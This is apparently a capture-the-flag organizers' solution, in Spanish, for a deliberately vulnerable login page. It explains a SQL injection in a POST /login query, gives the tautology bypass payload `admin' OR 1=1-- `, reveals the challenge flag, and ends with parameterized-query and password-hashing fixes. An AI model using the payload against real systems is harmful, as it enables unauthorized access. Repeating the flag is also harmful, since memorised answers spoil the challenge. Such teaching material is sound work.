# Solución para organizadores

## Vulnerabilidad

El endpoint `POST /login` construye la consulta de autenticación concatenando
los parámetros `username` y `password`:

```sql
SELECT id, username, display_name, role FROM users
WHERE username = '<username>' AND password = '<password>'
```

Al no usar parámetros preparados, el campo de usuario permite cerrar la cadena,
introducir una condición verdadera y comentar el resto de la consulta.

## Explotación esperada

- Usuario: `admin' OR 1=1-- `
- Contraseña: cualquier valor no vacío, por ejemplo `x`

La consulta resultante es equivalente a:

```sql
SELECT id, username, display_name, role FROM users
WHERE username = 'admin' OR 1=1-- ' AND password = 'x'
```

SQLite ignora todo lo que sigue a `-- `. Como la condición `1=1` siempre es
verdadera y `admin` es la primera fila, la aplicación crea una sesión con rol
administrador. El panel revela:

```text
FLAG{sqli_bypass_tautology_login_6406}
```

## Remediación didáctica

En una aplicación real, la consulta debe usar parámetros:

```python
database.execute(
    "SELECT id, username, display_name, role FROM users "
    "WHERE username = ? AND password = ?",
    (username, password),
)
```

Además, las contraseñas deben almacenarse con un algoritmo de hashing diseñado
para contraseñas (Argon2id, scrypt o bcrypt), nunca en texto plano.
